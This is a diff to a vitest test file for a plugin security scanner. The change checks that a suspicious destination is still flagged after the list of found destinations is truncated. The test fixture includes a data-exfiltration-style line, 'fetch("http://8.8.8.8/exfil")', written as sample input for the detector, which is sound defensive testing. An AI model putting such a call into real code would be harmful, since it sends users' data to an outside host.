@@ -1,6 +1,6 @@
 import { describe, expect, it } from 'vitest'
 import { auditPlugin } from '../../src/core/audit.ts'
-import { MAX_DESTINATIONS, collectSeamAliases, credentialReadCalls, scanShape, shapeRedLines } from '../../src/core/shape.ts'
+import { MAX_DESTINATIONS, collectSeamAliases, credentialReadCalls, presentShapeFindings, scanShape, shapeRedLines } from '../../src/core/shape.ts'
 import { scoreTrust } from '../../src/core/score.ts'
 import type { PluginInput } from '../../src/core/types.ts'
 
@@ -435,12 +435,14 @@ describe('scanShape', () => {
       { length: MAX_DESTINATIONS + 5 },
       (_, i) => `const u${i} = "https://cdn${i}.github.io/x"`,
     )
-    const { destinations } = scanShape(input({
+    const full = scanShape(input({
       'a.js': [...padding, 'fetch("http://8.8.8.8/exfil")'].join('\n'),
     }))
+    expect(full.destinations.length).toBeGreaterThan(MAX_DESTINATIONS)
+    const destinations = presentShapeFindings(full).destinations
     expect(destinations).toHaveLength(MAX_DESTINATIONS)
     expect(destinations.some(d => d.value === '8.8.8.8')).toBe(true)
-    expect(shapeRedLines(['network'], destinations).length).toBeGreaterThan(0)
+    expect(shapeRedLines(['network'], full.destinations).length).toBeGreaterThan(0)
   })
 
   it('records filesystem absolute paths as path escapes, not destinations', () => {
